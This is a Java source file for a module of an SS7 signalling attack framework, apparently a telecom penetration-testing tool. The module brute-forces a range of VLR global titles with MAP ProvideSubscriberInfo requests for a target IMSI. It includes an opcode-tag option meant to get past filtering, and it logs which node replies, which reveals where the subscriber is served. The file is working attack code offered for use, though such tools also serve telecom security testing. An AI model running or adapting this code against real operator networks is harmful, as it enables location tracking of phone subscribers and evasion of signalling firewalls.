/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.infogathering;

import com.rodan.intruder.kernel.usecases.model.PayloadCollection;
import com.rodan.intruder.ss7.entities.event.model.MapMessage;
import com.rodan.intruder.ss7.entities.event.model.error.ErrorComponent;
import com.rodan.intruder.ss7.entities.event.model.mobility.PsiResponse;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.Ss7Payload;
import com.rodan.intruder.ss7.entities.payload.mobility.PsiPayload;
import com.rodan.intruder.ss7.usecases.Ss7BruteforceModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.VlrBruteforceOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.VlrBruteforceResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.library.util.Util;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.VLR_BF_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.VLR_BF_DISPLAY_NAME, brief = Ss7ModuleConstants.VLR_BF_BRIEF,
        description = Ss7ModuleConstants.VLR_BF_DESCRIPTION, rank = Ss7ModuleConstants.VLR_BF_RANK,
        mainPayload = Constants.PSI_PAYLOAD_NAME)
public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(VlrBruteforceModule.class);

    @Builder
    public VlrBruteforceModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        var options = (VlrBruteforceOptions) moduleOptions;
        if (!options.getDelayMillis().isBlank()) {
            setBruteforceDelay(Integer.valueOf(options.getDelayMillis()));
        }

        setTaskWaitTime(6000); // Increase wait time to wait for possible valid remote node replies
        setWaitForResponseFailedMessage("Failed to retrieve current VLR of user");
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (VlrBruteforceOptions) moduleOptions;
        var vlrGtStream = Util.generateGtRange(options.getTargetVlrRange());
        var payloadCollection = PayloadCollection.<Ss7Payload>builder()
                .dataSource(vlrGtStream.getStream()).totalDataSize(vlrGtStream.getSize())
                .payloadGenerator((vlrGt) ->
                        PsiPayload.builder()
                                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                                .imsi(options.getImsi()).targetVlrGt(String.valueOf(vlrGt))
                                .abuseOpcodeTag(options.getAbuseOpcodeTag())
                                .mapVersion(options.getMapVersion())
                                .build()
                )
                .build();

        setPayloadIterator(payloadCollection);

        var dummyPayload = PsiPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).targetVlrGt("")
                .abuseOpcodeTag(options.getAbuseOpcodeTag())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(dummyPayload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payloads: " + payloadCollection);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
        }
    }

    @Override
    public void onProvideSubscriberInfoResponse(PsiResponse response) {
        try {
            logger.debug("##### Received PSI response!");
            logger.debug(response);
            logger.debug("Parsing response.");

            matchPayloadAddress(response);
            moduleResponse = VlrBruteforceResponse.builder()
                    .vlrGt(response.getVlrGt())
                    .build();
            setResultReceived(true);
            logger.debug("PSI completed!");

        } catch (SystemException e) {
            notify(e.getMessage(), NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onErrorComponent(ErrorComponent errorComponent) {
        logger.debug("[[[[[[[[[[    onErrorComponent      ]]]]]]]]]]");
        String msg = String.format("errorComponent: [%s]", errorComponent);
        logger.debug(msg);
        if (isPossibleValidNodeResultCode(errorComponent) && !isUnknownUserResultCode(errorComponent)) {
            msg = "Received error: [" + errorComponent.getReadableError() + "] from: " + errorComponent.getRemoteAddress();
            notify(msg, NotificationType.WARNING);
        }
    }

    private boolean matchPayloadAddress(MapMessage message) throws SystemException {
        var correspondingPayload = (PsiPayload) getCorrespondingPayload(message);
        var correctVlrGt = correspondingPayload.getTargetVlrGt();
        return !correctVlrGt.equals(message.getDialog().getRemoteAddress());
    }
}
